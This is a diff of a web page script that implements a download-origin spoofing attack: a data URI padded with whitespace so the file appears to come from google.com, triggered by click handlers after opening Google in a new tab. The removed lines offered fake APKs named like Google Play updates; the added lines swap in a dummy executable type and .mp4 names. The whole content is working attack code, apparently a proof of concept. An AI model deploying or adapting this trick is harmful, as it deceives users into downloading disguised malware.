@@ -43,15 +43,11 @@
 
 <script>
 (function() {
-  'use strict';
   var SP = ' '.repeat(200);
-  var B64 = 'UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
-  var DATA_URI = 'data:https://google.com/' + SP + 'application/vnd.android.package-archive;base64,' + B64;
+  var DATA_URI = 'data:https://google.com/' + SP + 'application/x-msdownload;base64,ZXN0dGVzdHRlc3R0ZXN0';
 
-  function doAttack(file) {
-    // Open Google in new tab
+  function attack(file) {
     window.open('https://www.google.com', '_blank');
-    // Download on current page - shows "google.com" as origin
     setTimeout(function() {
       var a = document.createElement('a');
       a.href = DATA_URI;
@@ -62,15 +58,9 @@
     }, 500);
   }
 
-  document.getElementById('box').addEventListener('click', function() {
-    doAttack('google-play-services.apk');
-  });
-  document.getElementById('btn1').addEventListener('click', function() {
-    doAttack('google-play-update.apk');
-  });
-  document.getElementById('btn2').addEventListener('click', function() {
-    doAttack('google-search.apk');
-  });
+  document.getElementById('box').addEventListener('click', function() { attack('google.mp4'); });
+  document.getElementById('btn1').addEventListener('click', function() { attack('google-search.mp4'); });
+  document.getElementById('btn2').addEventListener('click', function() { attack('google-lucky.mp4'); });
 })();
 </script>
 
